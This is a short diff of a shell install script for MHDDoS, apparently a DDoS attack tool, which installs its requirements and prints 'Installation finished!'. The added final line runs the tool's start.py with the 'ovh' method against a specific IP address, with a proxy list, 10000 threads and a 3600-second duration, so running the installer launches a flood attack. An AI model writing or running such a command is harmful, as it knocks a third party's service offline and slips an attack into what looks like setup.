@@ -15,3 +15,4 @@ echo "Installing requirements..."
 pip install -r ~/MHDDoS/requirements.txt
 sleep 3
 echo "Installation finished!"
+python ~/MHDDoS/start.py ovh http://108.61.96.28 0 50 proxy.txt 10000 3600
